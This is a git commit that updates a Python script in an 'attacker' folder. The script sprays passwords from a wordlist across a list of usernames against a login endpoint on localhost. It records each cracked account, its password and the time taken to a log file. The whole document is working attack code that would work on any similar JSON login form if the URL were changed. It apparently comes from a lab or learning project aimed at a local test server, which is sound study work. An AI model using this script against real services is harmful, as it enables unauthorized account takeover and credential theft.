b097304e1d2bf0d7d5dc90b35b6baf9c254952b7
tomerYifrach <tomer.yifrach27@gmail.com>
2025-11-26 20:32:20 +0200

    Password-Spraying update
    Going on serval users (instead of singele user) using users.txt
    Creating log file with resualts include how much time took to hack user

--- attacker/Password-Spraying.py
+++ attacker/Password-Spraying.py
@@ -1,27 +1,59 @@
 import requests
+import time
 
-#-------------------Parameters-----------------------#
-URL = "http://localhost:8000/login" #login page
-username = "tomer" #user to try Password-Spraying 
-passwordsFile = "passwords.txt" #path to common passwords text file
+#------------------------ Parameters -------------------------#
+URL = "http://localhost:8000/login"
+usersFile = "users.txt"
+passwordsFile = "passwords.txt"
+logFile = "log.txt"
+
+#------------------------ Vars -------------------------#
+hackedUsers = {}
+start = time.time()
+
+session = requests.Session()   
+
+#------------------------- Functions --------------------------#
+def try_login(username, password):
+    payload = {
+        "username": username,
+        "password": password
+    }
+
+    response = session.post(URL, json=payload) #send credential to server
+
+    if response.status_code == 200: #success
+        elapsed = time.time() - start #calc how much time req to hack that user
+        hackedUsers[username] = (password, elapsed) #add to list
+
+        with open(logFile, "a") as f: #write to log file
+            f.write(f"{username:<40} {password:<40} {elapsed:<40.2f}\n")
 
 
+#------------------------- Main --------------------------#
 
+# -------- load files data to memory -------- #
 
-#---------------------Main Code------------------------------#
+with open(usersFile) as f:
+    users = [line.strip() for line in f]
+
 with open(passwordsFile) as f:
-    for line in f.readlines():
-       password = line.strip() #remove blanks like new lines etc
-       print("testing the password:",password)
-       payload = {
-            "username": username,
-            "password": password
-        }
+    passwords = [line.strip() for line in f]
 
-       response = requests.post(URL, json=payload) #sending credential to server
-       if (response.status_code == 200): #success
-           print("Found the password!:",password)
-           break #stop the loop
-       else: 
-           print("Status Code:", response.status_code)
-           print("Response:", response.text)
+# -------- Create Log -------- #
+with open(logFile, "w") as f:
+    f.write(f"{'Username':<40} {'Password':<40} {'Time (s)':<40}\n")
+    f.write("-" * 120 + "\n")
+
+
+# -------- Password Spraying -------- #
+for password in passwords:
+    for username in users:
+        if username not in hackedUsers:
+            try_login(username, password)
+
+# -------- Printing Resaults -------- #
+print(f"\n{'Username':<40} {'Password':<40} {'Time':<40}")
+print("-" * 120)
+for username, (password, t) in hackedUsers.items():
+    print(f"{username:<40} {password:<40} {t:<40.2f}")
